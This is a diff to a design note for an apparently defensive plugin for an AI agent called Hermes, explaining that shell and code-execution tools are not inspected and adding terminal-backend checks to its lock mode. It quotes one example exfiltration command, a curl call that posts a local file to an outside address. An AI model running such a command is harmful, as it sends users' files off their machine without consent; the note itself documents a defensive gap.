@@ -154,7 +154,7 @@ can block it.
 ## 3. Shell and code-execution tools are not inspected
 
 **The gap.** `terminal`, `process_manage` and `execute_code` run on this host, and they can open any
-network connection. A command such as `curl -d @notes.txt https://...` sends a file off the machine.
+network connection. They run on this host only on Hermes' `local` terminal backend. A command such as `curl -d @notes.txt https://...` sends a file off the machine.
 
 **Why it exists.** Hermes gives a plugin the command string. It does not tell the plugin what the
 command will connect to. Guessing from command text is unreliable.
@@ -162,13 +162,22 @@ command will connect to. Guessing from command text is unreliable.
 **What the plugin does today.** It classifies these tools as on-host and lets them run. The closing
 paragraph of every receipt says that shell and code tools are not covered.
 
+The terminal backend decides where these tools run. It is set by `terminal.backend` in `config.yaml`,
+or by the `TERMINAL_ENV` environment variable when the config does not set it. On `ssh`, `modal`,
+`managed_modal`, `daytona`, `vercel_sandbox`, `docker` or a plugin backend, these three tools run in
+a container or on another machine. So do `read_file`, `write_file`, `patch` and `search_files`. The
+preflight therefore refuses to lock unless both sources say `local`, and its row names the backend
+it found and the key to change. The tool gate checks the backend again on each call to one of the
+seven tools. That check covers a backend that code registers for one task. A call on another backend
+is blocked.
+
 A three-mode rule is reserved in the code but not shipped (`gate_tools.MODE_TOOLS`). The three modes
 would be: ask on commands that look like network access, allow all, or block.
 
 **The core change that would close it.** A network policy on the terminal backend that a plugin can
 read and require. One example is the docker backend with networking off, exposed through
-`terminal.backend` and `terminal.docker_network`. Locked mode could then refuse to lock on a backend
-that is not contained, instead of guessing from command text.
+`terminal.backend` and `terminal.docker_network`. Locked mode could then accept that contained
+backend as well as `local`, and refuse every other one, instead of guessing from command text.
 
 ## 4. MCP command servers are not inspected
 
